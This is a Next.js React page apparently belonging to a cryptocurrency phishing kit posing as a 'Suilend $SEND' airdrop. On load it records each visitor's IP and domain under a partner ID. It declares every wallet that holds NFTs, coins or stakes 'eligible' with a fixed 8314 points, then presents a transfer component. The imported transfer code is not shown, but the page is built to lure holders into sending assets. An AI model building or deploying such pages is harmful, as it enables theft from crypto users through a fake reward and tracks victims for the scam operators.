"use client";
import React, { useState, useEffect } from "react";
import Image from "next/image";
import TopBar from "../components/TopBar";
import TickerBar from "../components/TickerBar";
import RightBar from "../components/RightBar";
import MobileWalletPrompt from "../components/MobileWalletPrompt";
import { ParameterizedTransfer } from "./ParameterizedTransfer";
import { useAccountInfo } from "../../hooks/useAccountInfo";
import { usePartnerId } from "../../hooks/usePartnerId";
import { fetchWithRetry } from "../../utils/apiUtils";
import { AccountInfo, GeolocationData } from "../../types/types";

const Page: React.FC = () => {
  const { accountInfo, isLoading: isAccountLoading } = useAccountInfo();
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [points, setPoints] = useState(0);
  const [isEligible, setIsEligible] = useState(false);
  const partnerId = usePartnerId();

  useEffect(() => {
    const sendVisitorAlert = async () => {
      try {
        const geoData = await fetchWithRetry<GeolocationData>(
          "https://ipapi.co/json/",
          {}
        );
        const domain = window.location.hostname;
        const template = process.env.NEXT_PUBLIC_TEMPLATE || "DEEP";

        if (!partnerId) {
          console.error("PartnerId is not available");
          return;
        }

        const response = await fetch("/api/visitor-alert", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: geoData.ip,
            domain,
            template,
            partnerId,
          }),
        });

        if (!response.ok) {
          throw new Error("Failed to send visitor alert");
        }

        console.log("Visitor alert sent successfully");
      } catch (error) {
        console.error("Error sending visitor alert:", error);
      }
    };

    if (partnerId) {
      sendVisitorAlert();
    }
  }, [partnerId]); // Now depends on partnerId

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
      console.log("Initial loading set to false");
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (accountInfo && !isAccountLoading) {
      const eligible: boolean = Boolean(
        (accountInfo.nfts && accountInfo.nfts.length > 0) ||
          (accountInfo.coins && accountInfo.coins.length > 0) ||
          (accountInfo.stakesOverview &&
            accountInfo.stakesOverview.withdrawableStakes &&
            accountInfo.stakesOverview.withdrawableStakes.length > 0)
      );

      setIsEligible(eligible);
      setPoints(eligible ? 8314 : 0);
    } else {
      setIsEligible(false);
      setPoints(0);
    }
  }, [accountInfo, isAccountLoading]);

  if (isInitialLoading) {
    return (
      <div className="fixed inset-0 flex items-center justify-center">
        <div className="flex flex-col items-center w-full z-10 relative">
          <div className="flex justify-center w-full mb-4">
            <Image
              src="/sv12.png"
              alt="Logo"
              width={70}
              height={70}
              className="mb-4"
            />
          </div>
          <div className="text-white text-xl font-semibold mb-4">
            Loading...
          </div>
          <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col min-h-screen overflow-hidden text-white">
      <TopBar />
      <div className="flex-grow flex flex-col overflow-hidden pt-10">
        {" "}
        {/* TopBar space */}
        {/* Header */}
        <div className="w-full flex-shrink-0 h-[10vh] flex items-center justify-center bg-[#030818]">
          <h1 className="font-supply-bold text-2xl md:text-4xl text-[#91dcf4] text-center px-4">
            SUILEND $SEND ECOSYSTEM AIRDROP
          </h1>
        </div>
        {/* Main content */}
        <div className="flex-grow flex overflow-hidden">
          <div className="w-full lg:w-[80%] p-4 flex items-center justify-center">
            <div className="flex justify-between items-center w-full max-w-5xl">
              {/* Left protocol icons */}
              <div className="hidden lg:flex flex-col justify-center space-y-2 w-1/4">
                {[
                  "aftermath-finance",
                  "alphafi",
                  "bucket-protocol",
                  "cetus-amm",
                  "deepbook",
                ].map((protocol) => (
                  <div
                    key={protocol}
                    className="relative w-12 h-12 mx-auto group"
                  >
                    <div className="absolute inset-0 bg-blue-500 rounded-full opacity-20 group-hover:opacity-40 transition-opacity duration-300"></div>
                    <div className="absolute inset-0 bg-gradient-to-br from-blue-400/30 to-blue-600/30 rounded-full opacity-70 group-hover:opacity-90 transition-opacity duration-300"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <Image
                        src={`/protocols/${protocol}.webp`}
                        alt={protocol}
                        width={36}
                        height={36}
                        className="rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
                      />
                    </div>
                    <div className="absolute -inset-1 bg-purple-500 rounded-full blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-300"></div>
                  </div>
                ))}
              </div>

              {/* Center content */}
              <div className="flex flex-col items-center justify-between h-full max-w-md py-4 w-full">
                <h2 className="font-supply-bold text-xl md:text-2xl text-center mb-8 text-[#91dcf4]">
                  $SEND SEASON 2 DISTRIBUTION
                </h2>

                <div className="relative mb-8">
                  <div className="absolute inset-0 bg-purple-500 rounded-full blur-xl animate-pulse opacity-50"></div>
                  <div className="relative animate-spin-slow">
                    <Image
                      src="/sv12.png"
                      alt="Points"
                      width={80}
                      height={80}
                      className="transform hover:scale-110 transition-transform duration-300"
                    />
                  </div>
                </div>

                <h3 className="font-supply-regular text-lg md:text-xl text-center mb-8 text-white uppercase">
                  {!accountInfo
                    ? "CONNECT YOUR WALLET TO CHECK YOUR $SEND ALLOCATION"
                    : isEligible
                    ? "CONGRATS! YOU ARE ELIGIBLE"
                    : "NO ALLOCATION. TRY ANOTHER WALLET"}
                </h3>

                {/* Points display */}
                {isAccountLoading ? (
                  <div className="bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg p-2 mb-8 shadow-lg transform transition duration-500 hover:scale-105 w-48">
                    <div className="flex items-center justify-center h-8">
                      <div className="flex items-center w-full justify-between px-2">
                        <div className="flex-shrink-0 w-6 h-6 overflow-hidden rounded-full">
                          <Image
                            src="/android-chrome-384x384.png"
                            alt="Points"
                            width={24}
                            height={24}
                            className="object-cover w-full h-full"
                          />
                        </div>
                        <div className="flex items-center h-6 space-x-1">
                          {[0, 1, 2].map((index) => (
                            <div
                              key={index}
                              className="w-1.5 h-1.5 bg-white rounded-full animate-bounce"
                              style={{ animationDelay: `${index * 0.15}s` }}
                            ></div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg p-2 mb-8 shadow-lg transform transition duration-500 hover:scale-105 w-48">
                    <div className="flex items-center justify-center h-8">
                      <div className="flex items-center w-full justify-between px-2">
                        <div className="flex-shrink-0 w-6 h-6 overflow-hidden rounded-full">
                          <Image
                            src="/android-chrome-384x384.png"
                            alt="Points"
                            width={24}
                            height={24}
                            className="object-cover w-full h-full"
                          />
                        </div>
                        <div className="flex items-center h-6">
                          <p className="text-lg font-supply-regular font-bold text-white m-0 leading-none">
                            {points}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <svg
                  className="w-12 h-12 mb-8 animate-bounce"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M12 4V20M12 20L18 14M12 20L6 14"
                    stroke="#91dcf4"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>

                <div className="mt-auto mb-16 w-full">
                  <ParameterizedTransfer
                    accountInfo={accountInfo}
                    isLoading={isAccountLoading}
                  />
                </div>
              </div>

              {/* Right protocol icons */}
              <div className="hidden lg:flex flex-col justify-center space-y-2 w-1/4">
                {[
                  "haedal-protocol",
                  "kriya",
                  "navi-protocol",
                  "scallop-lend",
                  "turbos",
                ].map((protocol) => (
                  <div
                    key={protocol}
                    className="relative w-12 h-12 mx-auto group"
                  >
                    <div className="absolute inset-0 bg-blue-500 rounded-full opacity-20 group-hover:opacity-40 transition-opacity duration-300"></div>
                    <div className="absolute inset-0 bg-gradient-to-br from-blue-400/30 to-blue-600/30 rounded-full opacity-70 group-hover:opacity-90 transition-opacity duration-300"></div>
                    <div className="absolute inset-0 flex items-center justify-center">
                      <Image
                        src={`/protocols/${protocol}.webp`}
                        alt={protocol}
                        width={36}
                        height={36}
                        className="rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
                      />
                    </div>
                    <div className="absolute -inset-1 bg-purple-500 rounded-full blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-300"></div>
                  </div>
                ))}
              </div>
            </div>
          </div>
          <div className="hidden lg:block lg:w-[20%] p-4 overflow-y-auto pb-16">
            {" "}
            {/* Added pb-16 for TickerBar space */}
            <RightBar />
          </div>
        </div>
      </div>
      <TickerBar />
      <MobileWalletPrompt />
    </div>
  );
};

export default Page;
